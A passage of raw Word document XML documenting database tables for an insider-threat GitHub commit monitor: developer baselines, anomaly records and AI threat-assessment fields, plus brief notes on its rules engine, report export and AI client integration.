      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>typical_hour_start / end</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Normal working hours (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>mean_commit_hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Statistical mean of commit hours</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>std_commit_hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Standard deviation of commit hours</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_additions / deletions / files_changed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Average commit size metrics</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>p90_additions / p90_deletions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>90th percentile size metrics</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_risk_score</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Average historical risk</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>avg_commits_per_week</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Activity rate</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>commit_count_used</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Commits in baseline window</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>baseline_status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>insufficient/partial/established</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_developer_anomalies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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>author_email</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Developer identifier</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>scan_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER FK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References github_commit_scans(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>anomaly_type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>off_hours_deviation / large_commit_* / risk_spike</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Human-readable description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>baseline_value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Expected value from baseline</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>observed_value</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Actual value in this commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>low/medium/high</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>acknowledged</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER DEFAULT 0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0=new, 1=acknowledged</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>github_commit_ai_analysis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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Column</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Type</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER PK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Auto-increment primary key</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>scan_id</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>INTEGER UNIQUE FK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>References github_commit_scans(id)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>threat_level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT NOT NULL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>intentional_insider / suspicious / negligent / false_positive</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>confidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>REAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>0.0 to 1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>impact_summary</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Real-world security impact description</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>intent_analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Intent classification rationale</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>malicious_scenario</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Attack scenario if malicious (nullable)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>key_indicators</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT (JSON)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Array of threat indicators</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>recommended_actions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT (JSON)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Array of recommended actions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>raw_response</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Full AI response for audit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>model_used</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>TEXT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>AI model identifier</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>11. Integration with Other Platform Features</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Custom Rules Engine</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The GitHub Monitor's SAST scanning (Stage 2, Step 4) directly uses the platform's Custom Rules engine. Rules with category="insider_threat" are loaded from the custom_rules table and executed against every commit diff. This means security teams can create new insider threat detection patterns that are immediately active in GitHub monitoring without any code changes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Report Service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The report_service.py includes _create_github_monitor_sheet() which builds an Excel sheet with GitHub monitoring data for export. This includes repository summaries, risk distributions, and developer risk rankings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>AI Client Factory</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The AI threat assessment uses the platform's shared AI client factory (AIConfig.from_user, get_ai_client). This means it automatically uses whatever AI provider and model the user has configured - OpenAI, Anthropic, or any other supported provider. The same AI configuration is shared across all platform features.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>12. File Reference</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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>File</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Lines</w:t>
            </w:r>
          </w:p>
